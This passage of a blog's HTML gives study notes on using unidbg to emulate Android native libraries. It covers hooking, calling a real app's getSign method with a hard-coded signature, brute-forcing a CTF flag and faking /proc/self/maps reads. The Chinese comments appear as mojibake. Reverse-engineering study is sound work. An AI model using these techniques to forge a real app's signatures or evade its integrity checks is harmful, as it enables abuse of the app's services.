class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="comment">//        emulator.getBackend().hook_add_new(new CodeHook() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void hook(Backend backend, long address, int size, Object user) &#123;</span></span><br><span class="line"><span class="comment">//                //å½“æ‰§è¡Œåˆ°0xABEæ‰§è¡Œè¿™ä¸ªå›è°ƒå‡½æ•°ï¼šä¿®æ”¹PCå¯„å­˜å™¨ä½¿ä»–è·³è¿‡ 4+1(Thumb)å­—èŠ‚ç  æ‰§è¡Œä¸‹ä¸€ä¸ªæ±‡ç¼–ä»£ç </span></span><br><span class="line"><span class="comment">//                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+4+1);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void onAttach(UnHook unHook) &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void detach() &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;,module.base+0xABE,module.base+0xABE,null);</span></span><br><span class="line">        <span class="comment">//æ–¹æ³•äºŒ æ–­ç‚¹</span></span><br><span class="line">     </span><br><span class="line">        emulator.attach().addBreakPoint(<span class="keyword">module</span>.base + <span class="number">0xABE</span>, <span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;</span><br><span class="line">            <span class="comment">//è·å–r1å¯„å­˜å™¨æŒ‡é’ˆ</span></span><br><span class="line">           <span class="comment">// UnidbgPointer                 pointer=UnidbgPointer.register(emulator,ArmConst.UC_ARM_REG_R1) ==ã€‹pointer.getString(0)</span></span><br><span class="line">            </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//falseï¼šåœ¨æ–­ç‚¹å¤„åœä¸‹ trueï¼šä¸ä¼šåœåœ¨æ–­ç‚¹å¤„</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     </span><br><span class="line">        String data=<span class="string">&quot;1636221462621&quot;</span>;</span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">strResult</span> <span class="operator">=</span> SignManager.callStaticJniMethodObject(emulator, <span class="string">&quot;getSign(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, data)); <span class="comment">// æ‰§è¡ŒJniæ–¹æ³•</span></span><br><span class="line">        System.out.println(strResult);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¡¥ç¯å¢ƒ</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;com/sichuanol/cbgc/util/LogShutDown-&gt;getAppSign()Ljava/lang/String;&quot;</span>.equals(signature))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;0093CB6721DAF15D31CFBC9BBE3A2B79&quot;</span>);  <span class="comment">//åŒ…è£…è¿”å›å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callStaticObjectMethodV(vm, dvmClass, signature, vaList);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbgä¸­çš„VirtualModule">unidbgä¸­çš„VirtualModule</h3><p>xjbç¬¬45è¯¾æ—¶</p><ul><li>unidbgçš„è™šæ‹Ÿæ¨¡å—åŠŸèƒ½ï¼Œå¯ä»¥ç”¨æ¥æ³¨å†Œè™šæ‹Ÿçš„soï¼Œè‡ªå·±å®ç°soä¸­ç›¸åº”çš„æ–¹æ³•</li><li>libandroid.soç”¨äºè¯»å–appçš„assestsèµ„æº</li><li><a href="http://xn--solibandroid-694s64nq38bkf1cwowh18ik0gw97c.so">å¦‚æœsoä¸­éœ€è¦ä¾èµ–è¯¥libandroid.so</a> å¯ä»¥æ³¨å†Œlibandroid.soåˆ°å†…å­˜ä¸­<br><code>new AndroidModule(emulator,vm).register(memory);</code></li><li>åœ¨unidbgæºç çš„java-&gt;virtualmodule.android-&gt;AndroidMoudleï¼ŒæŠŠä»–æ”¾åœ¨ç›¸åº”çš„.javaåŒåŒ…ä¸‹åœ¨è¿›è¡Œä¿®æ”¹ã€‚</li></ul><p>ä»¥xjbè¯¾ç¨‹çš„NativeHelperä¸ºä¾‹ <a href="http://xn--xiaojianbangA-hu1u681cs17a4d0lec2b.so">åŠ è½½è‡ªå®šä¹‰xiaojianbangA.so</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaojianbangAModule</span> <span class="keyword">extends</span> <span class="title class_">VirtualModule</span>&lt;VM&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaojianbangAModule</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(emulator, vm, <span class="string">&quot;libxiaojianbangA.so&quot;</span>); <span class="comment">//è¦æ¨¡æ‹Ÿçš„so</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onInitialize</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="keyword">final</span> VM vm, Map&lt;String, UnidbgPointer&gt; symbols)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">is64Bit</span> <span class="operator">=</span> emulator.is64Bit();</span><br><span class="line">        <span class="type">SvcMemory</span> <span class="variable">svcMemory</span> <span class="operator">=</span> emulator.getSvcMemory();</span><br><span class="line">        symbols.put(<span class="string">&quot;_Z7bssFuncv&quot;</span>, svcMemory.registerSvc(is64Bit ? <span class="keyword">new</span> <span class="title class_">Arm64Svc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : <span class="keyword">new</span> <span class="title class_">ArmSvc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åŠ è½½çš„å†…å®¹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fromJava</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;libxiaojianbangA.so&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸»è¦javaä»£ç ä¸­ æ·»åŠ </span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">XiaojianbangAModule</span>(emulator, vm).register(memory);</span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/xiaojianbang/ndk/libxiaojianbang.so&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="unidbgè¿›è¡Œçˆ†ç ´æ±‚flag">unidbgè¿›è¡Œçˆ†ç ´æ±‚flag</h3><p>nativeä¸º(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</p><p>é€šè¿‡çˆ†ç ´ä¸å·²çŸ¥å­—ç¬¦ä¸²ç›¸æ¯”è¾ƒæ±‚flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.monkeylord.illusion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.AndroidEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Emulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.HookStatus;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.HookContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.ReplaceCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.HookZz;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidARMEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.*;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Module;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.array.ByteArray;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.memory.Memory;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.pointer.UnidbgPointer;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Pointer;</span><br><span class="line"><span class="keyword">import</span> unicorn.Arm64Const;</span><br><span class="line"><span class="keyword">import</span> unicorn.ArmConst;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">illusion</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line">    <span class="keyword">private</span> DvmClass cNative;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String r0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">illusion</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºæ¨¡æ‹Ÿå™¨å®ä¾‹,è¿›ç¨‹åå»ºè®®ä¾ç…§å®é™…è¿›ç¨‹åå¡«å†™ï¼Œå¯ä»¥è§„é¿é’ˆå¯¹è¿›ç¨‹åçš„æ ¡éªŒ</span></span><br><span class="line">        emulator = AndroidEmulatorBuilder.for32Bit().setProcessName(<span class="string">&quot;monkeylord.illusion&quot;</span>).build();</span><br><span class="line">        <span class="comment">// è·å–æ¨¡æ‹Ÿå™¨çš„å†…å­˜æ“ä½œæ¥å£</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Memory</span> <span class="variable">memory</span> <span class="operator">=</span> emulator.getMemory();</span><br><span class="line">        <span class="comment">// è®¾ç½®ç³»ç»Ÿç±»åº“è§£æ</span></span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        <span class="comment">// åˆ›å»ºAndroidè™šæ‹Ÿæœº,ä¼ å…¥APKï¼ŒUnidbgå¯ä»¥æ›¿æˆ‘ä»¬åšéƒ¨åˆ†ç­¾åæ ¡éªŒçš„å·¥ä½œ</span></span><br><span class="line"><span class="comment">//        vm =  emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/java/com/test/llusion.apk&quot;));</span></span><br><span class="line">        vm =  emulator.createDalvikVM();</span><br><span class="line">        <span class="comment">// åŠ è½½ç›®æ ‡SO</span></span><br><span class="line">        <span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/monkeylord/illusion/libnative-lib.so&quot;</span>), <span class="literal">true</span>); <span class="comment">// åŠ è½½soåˆ°è™šæ‹Ÿå†…å­˜</span></span><br><span class="line">        <span class="comment">//è·å–æœ¬SOæ¨¡å—çš„å¥æŸ„,åç»­éœ€è¦ç”¨å®ƒ</span></span><br><span class="line">        <span class="keyword">module</span> = dm.getModule();</span><br><span class="line">        vm.setJni(<span class="built_in">this</span>); <span class="comment">// è®¾ç½®JNI</span></span><br><span class="line">        vm.setVerbose(<span class="literal">false</span>); <span class="comment">// æ‰“å°æ—¥å¿—</span></span><br><span class="line"></span><br><span class="line">        dm.callJNI_OnLoad(emulator); <span class="comment">// è°ƒç”¨JNI OnLoad</span></span><br><span class="line">        DvmObject&lt;?&gt; thiz = vm.resolveClass(<span class="string">&quot;monkeylord/illusion/MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">illusion</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">illusion</span>();</span><br><span class="line">        test.hook();</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag_enc</span> <span class="operator">=</span> <span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; flag_enc.length(); index++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">33</span>; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">                test.CheckFlag(flag + String.valueOf((<span class="type">char</span>) i), flag_enc);  <span class="comment">// è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line">                <span class="comment">//System.out.println(illusion.r0.length());</span></span><br><span class="line">                <span class="keyword">if</span> ((illusion.r0.length() &gt; index)  &amp;&amp; (flag_enc.charAt(index) == illusion.r0.charAt(index))) &#123;</span><br><span class="line">                    flag += String.valueOf((<span class="type">char</span>) i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;Flag[0:&quot;</span>+index+<span class="string">&quot;]: &quot;</span>+flag);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Completely Flag is: &quot;</span>+flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">CheckFlag</span><span class="params">(String flag, String flag_enc)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºjobjectå¯¹è±¡</span></span><br><span class="line">        <span class="comment">//DvmObject&lt;?&gt; thiz = vm.resolveClass(&quot;monkeylord/illusion/MainActivity&quot;).newObject(null);</span></span><br><span class="line"><span class="comment">//        List&lt;Object&gt; list = new ArrayList&lt;&gt;(10);</span></span><br><span class="line"><span class="comment">//        list.add(vm.getJNIEnv());</span></span><br><span class="line"><span class="comment">//        list.add(0);</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag)));   // arg 3</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag_enc)));   // arg 4</span></span><br><span class="line">        <span class="comment">//list.toArray()</span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span>  <span class="keyword">module</span>.callFunction(emulator, <span class="number">0xdc9</span>, vm.getJNIEnv(),<span class="number">0</span>,vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag)),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag_enc)));</span><br><span class="line"><span class="comment">//        System.out.print(&quot;result:&quot;);</span></span><br><span class="line"><span class="comment">//        DvmObject&lt;?&gt; object = vm.getObject(number.intValue());</span></span><br><span class="line"><span class="comment">//        System.out.print(object.getValue().toString());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HookZz</span> <span class="variable">hook</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">        hook.replace(<span class="keyword">module</span>.base + <span class="number">0x00000E64</span>+<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(0).getString(0));  // å…¥å‚1 R0å¯„å­˜å™¨</span></span><br><span class="line">                illusion.r0 = context.getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(1).getString(0));  // å…¥å‚2 R1å¯„å­˜å™¨</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, context,originFunction);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç»“æœè½¬åŒ–ä¸ºbase64ç¼–ç å½¢å¼">ç»“æœè½¬åŒ–ä¸ºbase64ç¼–ç å½¢å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1b1cd</span>, list.toArray());</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(resultArr.getValue());</span><br></pre></td></tr></table></figure><h3 id="UTF-8ç¼–ç ">UTF-8ç¼–ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1a981</span>, list.toArray());</span><br><span class="line"><span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line"><span class="type">String</span> <span class="variable">md5result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(resultArr.getValue(), StandardCharsets.UTF_8);</span><br><span class="line">System.out.println(<span class="string">&quot;md5result:&quot;</span>+md5result);</span><br></pre></td></tr></table></figure><h2 id="Unidbgå¤„ç†soä¸ç³»ç»Ÿçš„äº¤äº’">Unidbgå¤„ç†soä¸ç³»ç»Ÿçš„äº¤äº’</h2><h3 id="æ–‡ä»¶è®¿é—®">æ–‡ä»¶è®¿é—®</h3><p>unidbgçš„æ–‡ä»¶ç³»ç»Ÿåˆ›å»ºçš„ç›®å½•åœ¨/tmp/rootfs/default</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¯»å–è‡ªå·±çš„mapsæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxx</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> <span class="keyword">implements</span> <span class="title class_">IOResolver</span>&#123;   <span class="comment">//å®ç°ä¸€ä¸ªæ¥å£æ–¹æ³•  </span></span><br><span class="line">    emulator = AndroidEmulatorBuilder   <span class="comment">//æ„å»ºæ¨¡æ‹Ÿå™¨å®ä¾‹</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">        <span class="comment">//å°†è¯¥ç›®å½•è®¾ç½®ä¸ºæ ¹è·¯å¾„</span></span><br><span class="line">        .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;../../filesystem&quot;</span>))</span><br><span class="line">                <span class="comment">//æ·»åŠ DynarmicFactoryåç«¯å·¥å‚ï¼Œä¸ºtrueå«ä¹‰ï¼šå¦‚æœå‡ºç°é—®é¢˜ é€€å›Unicornå·¥å‚</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line">    <span class="comment">//å°†å½“å‰ç±»çš„å®ä¾‹å¯¹è±¡ä½œä¸ºIOResolverè¿›è¡Œæ·»åŠ </span></span><br><span class="line">    emulator.getSyscallHandler().addIOResolver(<span class="built_in">this</span>);</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//è¯»å–æ–‡ä»¶å°±ä¼šæ‰§è¡Œresolveræ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolver</span><span class="params">(Emulator emulator,String pathname,<span class="type">int</span> oflags)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((pathname).equals(<span class="string">&quot;/proc/self/maps&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//å°†æ–‡ä»¶é‡å®šå‘åˆ°è‡ªå·±æƒ³è¦çš„ä½ç½®</span></span><br><span class="line">            File reg=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!reg.exists())&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    reg.createNewFile();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                     &#125;</span><br><span class="line">            &#125;</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">SimpleFileIO</span>(oflags,reg,pathname)); <span class="comment">//æ–‡ä»¶æ–¹å¼è¿”å›</span></span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">ByteArrayFileIO</span>(oflag,pathname,<span class="string">&quot;xxx&quot;</span>.getbytes)); <span class="comment">//å­—ç¬¦ä¸²å¸¸é‡è¿”å›</span></span><br><span class="line">&#125;</span><br><span class="line">        System.out.println(pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>çœ‹é›ª3w</h1><h2 id="ç¬¬ä¸€è¯¾æ—¶">ç¬¬ä¸€è¯¾æ—¶</h2><h3 id="capstoneå’ŒkeystoneåŸºæœ¬ä½¿ç”¨">capstoneå’ŒkeystoneåŸºæœ¬ä½¿ç”¨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> 